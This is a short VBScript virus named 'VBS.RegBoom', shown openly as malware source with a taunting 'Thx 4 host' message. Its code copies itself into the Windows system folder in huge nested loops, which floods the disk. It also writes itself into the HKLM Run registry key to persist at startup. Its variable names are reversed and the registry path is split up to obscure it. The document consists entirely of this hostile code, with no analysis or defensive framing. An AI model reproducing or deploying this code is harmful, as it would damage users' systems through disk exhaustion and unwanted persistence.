   'VBS.RegBoom
   Set etirWgeR = CreateObject("wscript.shell")
   Set ypoC=f.GetFile(WScript.ScriptFullName)
   Set swodniW=f.GetSpecialFolder(0)
   emaNriV = "RegBoom"

   eMevaS(emaNriV & ".vbs")
   For b = 1 to 9000000
   for a = 1 to 9000000
   for c = 1 to 9000000
   eMevaS(emaNriV & "_" & a & "_" & b & "_" & c & ".vbs");
   Next
   Next
   Next
   MsgBox "Thx 4 host VBS.RegBoom"

   function eMevaS(Filez)
     etirWgeR.RegWrite "H" & "K" & "L" & "M" & "\S" & "O" & "F" & "T" & "W" & "A" & "R" & "E\Micr" & "osoft\Wind" & "ows\Current" & "Version\R" & "un\"& emaNriV, Filez
     ypoC.Copy(swodniW & "\" & Filez)
   End Function
